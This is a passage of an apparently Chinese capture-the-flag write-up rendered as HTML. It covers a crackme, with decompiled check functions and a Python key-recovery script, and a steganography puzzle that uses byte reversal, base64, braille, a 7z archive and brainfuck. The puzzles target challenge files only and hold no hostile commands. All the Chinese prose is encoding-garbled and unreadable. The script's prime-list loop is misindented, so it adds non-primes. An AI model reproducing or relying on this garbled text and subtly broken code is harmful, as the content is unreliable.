__int8)s[<span class="number">2</span>]) != <span class="number">49</span> )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬å››ä¸ªæ•°å¤§äºç¬¬ä¸‰ä¸ªæ•°ï¼Œä½†æ˜¯ä¸¤è€…å¹³æ–¹å’Œç›¸ç­‰ï¼Œæ˜¾ç„¶æ˜¯æº¢å‡ºï¼Œåœ¨è®¡ç®—ä¸­é€šè¿‡æ¨¡256ï¼ˆå³0xFFï¼‰æ¥å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">3</span>] &gt; s[<span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">2</span>] * s[<span class="number">2</span>] != s[<span class="number">3</span>] * s[<span class="number">3</span>] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿˜å‡ºç°äº†ä¸€ä¸ªæ£€æŸ¥ç´ æ•°çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_prime</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)c &gt; <span class="number">1u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)c &gt; <span class="number">2u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">2</span>; v3 &amp;&amp; i &lt; (<span class="keyword">unsigned</span> __int8)c; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !((<span class="keyword">unsigned</span> __int8)c % i) )</span><br><span class="line">          v3 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äº”å’Œç¬¬å…­ä¸ªå­—ç¬¦ç›¸äº’å¼‚æˆ–ç­‰äº126ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check6</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_prime(s[<span class="number">4</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_prime(s[<span class="number">5</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)s[<span class="number">4</span>] ^ (<span class="keyword">unsigned</span> __int8)s[<span class="number">5</span>]) != <span class="number">126</span> )</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸ƒä¸ªå­—ç¬¦çš„1/2æ˜¯ç´ æ•°ï¼Œä¸”ç¬¬ä¸ƒä¸ªå­—ç¬¦ç­‰äºç¬¬å…­ä¸ªå­—ç¬¦å‡å»42çš„ä¸¤å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check7</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_prime(s[<span class="number">6</span>] / <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">6</span>] != <span class="number">2</span> * (s[<span class="number">5</span>] - <span class="number">42</span>) )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬å…«ä¸ªæ•°å­—åœ¨(47, 57]èŒƒå›´å†…ï¼Œå³ç§»ä¸¤ä½åä¹˜å››ç­‰äºæœ¬èº«ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check8</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">7</span>] &lt;= <span class="number">47</span> || s[<span class="number">7</span>] &gt; <span class="number">57</span> )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * (<span class="keyword">char</span>)(s[<span class="number">7</span>] &gt;&gt; <span class="number">2</span>) != s[<span class="number">7</span>] )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥æ•°å­—ä¸ç¬¬å…«ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ°ç¬¬ä¹ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __usercall check9@&lt;rax&gt;(<span class="keyword">unsigned</span> __int8 a1@&lt;efl&gt;, __int64 a2, <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> s[<span class="number">8</span>] == (a1 ^ (<span class="keyword">unsigned</span> __int8)s[<span class="number">7</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤å€å…³ç³»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check10</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">2</span> * a1[<span class="number">8</span>] != a1[<span class="number">9</span>] )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¡ç®—å¾—å‡ºç¬¬åä¸€ä¸ªæ•°å­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">check11</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, <span class="keyword">char</span> *a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  __int16 sum; <span class="comment">// ax</span></span><br><span class="line"></span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int8)a8[<span class="number">9</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    sum += v8--;</span><br><span class="line">  <span class="keyword">while</span> ( v8 );</span><br><span class="line">  <span class="keyword">return</span> a8[<span class="number">10</span>] == HIBYTE(sum) * (_BYTE)sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ç›¸å¯¹æ¯”è¾ƒå¸¸è§„ï¼Œä½†åšä¸‹æ¥æœ‰äº›è€—æ—¶ã€‚æœ€åå†™å‡ºè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">primes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>, i):</span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            primes.append(i)</span><br><span class="line"></span><br><span class="line">s = <span class="number">11</span> * [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># s[0], s[1] = 37, 94 # %^Jv!_j0"Dz ==&gt; wrong</span></span><br><span class="line">s[<span class="number">0</span>], s[<span class="number">1</span>] = <span class="number">47</span>, <span class="number">74</span> <span class="comment"># /JTl!_j0"Dz ==&gt; right</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(s[<span class="number">0</span>] * s[<span class="number">1</span>] == <span class="number">3478</span>)</span><br><span class="line"></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] ^ s[<span class="number">1</span>] ^ <span class="number">49</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s[<span class="number">2</span>] + <span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i * i % <span class="number">256</span> == s[<span class="number">2</span>] * s[<span class="number">2</span>] % <span class="number">256</span>:</span><br><span class="line">        s[<span class="number">3</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get456</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">32</span> <span class="keyword">and</span> j &gt; <span class="number">32</span> <span class="keyword">and</span> (i ^ j) % <span class="number">256</span> == <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">if</span> j - <span class="number">42</span> <span class="keyword">in</span> primes <span class="keyword">and</span> <span class="number">2</span> * j &lt; <span class="number">256</span>:</span><br><span class="line">                    <span class="keyword">return</span> (i, j, <span class="number">2</span> * (j - <span class="number">42</span>))</span><br><span class="line"></span><br><span class="line">s[<span class="number">4</span>], s[<span class="number">5</span>], s[<span class="number">6</span>] = get456()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>, <span class="number">58</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">4</span> * (i &gt;&gt; <span class="number">2</span>) == i:</span><br><span class="line">        s[<span class="number">7</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s[<span class="number">8</span>] = <span class="number">0x12</span> ^ s[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s[<span class="number">9</span>] = <span class="number">2</span> * s[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">s[<span class="number">10</span>] = <span class="number">0x7A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">assert</span>(c &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(map(chr, s)))</span><br></pre></td></tr></table></figure><p>æ®è¯´è¿™é‡Œå¯ä»¥ç¬¦å·æ‰§è¡Œç”¨angråšã€‚</p><h1 id="MISC-Blind-Date"><a href="#MISC-Blind-Date" class="headerlink" title="MISC-Blind Date"></a>MISC-Blind Date</h1><p><code>xxd</code>ä¸€ä¸‹æ–‡ä»¶å¤´ï¼Œæ ¹æ®jpegæ–‡ä»¶å¤´ç‰¹å¾å¯ä»¥å‘ç°æ¯å››å­—èŠ‚è¢«å€’è¿‡æ¥äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ &gt; xxd BlindDate.jpeg | head</span><br><span class="line">00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101  ....FJ....FI`...</span><br><span class="line">00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000  ..`."...fixEMM..</span><br><span class="line">00000020: 0000 2a00 0100 0800 0300 1201 0100 0000  ..*.............</span><br><span class="line">00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544  ............kcuD</span><br><span class="line">00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1  ...y.......Kh~..</span><br><span class="line">00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562  :pttsn//oda.c.eb</span><br><span class="line">00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c  x/mo1/pa./0.px?&lt;</span><br><span class="line">00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22  ekcaeb t=nig..."</span><br><span class="line">00000080: 6469 2022 3557 223d 704d 304d 6968 6543  di "5W"=pM0MiheC</span><br><span class="line">00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439  erzHTNzSckzc?"d9</span><br></pre></td></tr></table></figure><p>ç”¨è„šæœ¬è¿‡é€†å›æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'BlindDate.jpeg'</span>, <span class="string">'rb'</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">    data += s[i:i + <span class="number">4</span>][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">new_f = open(<span class="string">'re_BlindData.jpeg'</span>, <span class="string">'wb'</span>)</span><br><span class="line">new_f.write(data)</span><br></pre></td></tr></table></figure><p><code>strings</code>ä¸€ä¸‹æ–°æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK</span><br></pre></td></tr></table></figure><p>è§£å¼€åå‘ç°æ˜¯ç›²æ–‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..   .  ..  ..   .  ..  ..   .  ..  .  ..</span><br><span class="line">.    .   .       .      .    .   .  .  </span><br><span class="line">    ..          ..      .   ..      .  .</span><br></pre></td></tr></table></figure><p>ç¿»è¯‘ä¸€ä¸‹ä¹‹åæ˜¯ï¼š<code>F4C3P4LM</code></p><p><code>binwalk</code>ä¸€ä¸‹æ–°æ–‡ä»¶ï¼Œåˆ†è§£å‡ºä¸€ä¸ªå¸¦å¯†ç çš„7zå‹ç¼©æ–‡ä»¶ã€‚æŠŠä¸Šé¢çš„å­—ç¬¦ä¸²ä½œä¸ºå¯†ç è§£å¼€ï¼Œå¾—åˆ°flagæ–‡æœ¬ï¼Œæ˜¯brainfuckï¼š</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="string">.</span>&gt;<span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span 